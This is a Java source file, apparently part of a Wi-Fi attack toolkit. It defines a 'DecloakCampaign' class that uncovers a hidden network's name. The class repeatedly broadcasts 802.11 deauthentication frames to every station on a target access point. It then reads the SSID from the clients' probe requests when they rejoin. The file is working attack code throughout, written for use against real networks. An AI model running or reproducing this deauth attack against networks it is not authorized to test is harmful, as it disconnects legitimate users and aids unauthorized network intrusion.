package com.opx.oss.engine.attacks;

import com.opx.oss.engine.AccessPoint;
import com.opx.oss.engine.ProbeBook;
import com.opx.oss.engine.ScanBook;
import com.opx.oss.engine.chips.WifiChip;
import com.opx.oss.engine.dot11.Frame;
import com.opx.oss.engine.dot11.Mac;

import org.json.JSONObject;

/**
 * Hidden SSIDs: push the AP's stations off with deauths and read the name they ask for when
 * they come back. The name arrives in a client's probe request, so the campaign waits for the
 * probe book to learn it rather than guessing.
 */
public final class DecloakCampaign extends Campaign {

    private static final int REASON = 7;

    private final ProbeBook probes;
    private final ScanBook book;
    private final int rounds;
    private final long listenMillis;

    public DecloakCampaign(WifiChip chip, String bssid, JSONObject options,
                           ProbeBook probes, ScanBook book) {
        super(chip, bssid, options);
        this.probes = probes;
        this.book = book;
        this.rounds = Math.max(1, options.optInt("rounds", 6));
        this.listenMillis = Math.max(500, options.optLong("listen", 3000));
    }

    @Override
    public String kind() {
        return "decloak";
    }

    @Override
    protected void run(Events events) throws Exception {
        byte[] target = Mac.of(bssid);
        for (int round = 1; round <= rounds && !shouldStop(); round++) {
            for (int burst = 0; burst < 6 && !shouldStop(); burst++) {
                chip.transmit(Frame.deauthAll(target, REASON));
            }
            log(events, "round " + round + ": asked the stations of " + bssid + " to rejoin");
            long deadline = System.currentTimeMillis() + listenMillis;
            while (System.currentTimeMillis() < deadline && !shouldStop()) {
                String ssid = probes.decloakFor(bssid);
                if (ssid != null) {
                    AccessPoint ap = book.get(bssid);
                    if (ap != null && ap.hidden) {
                        ap.ssid = ssid;
                        ap.hidden = false;
                    }
                    log(events, "decloaked: " + ssid);
                    progress(events, 100, "hidden SSID recovered");
                    events.emit(event("targets_updated"));
                    return;
                }
                sleep(200);
            }
            progress(events, (round * 100) / (rounds + 1), "round " + round + " of " + rounds);
        }
        log(events, "no client named this hidden network yet");
    }
}
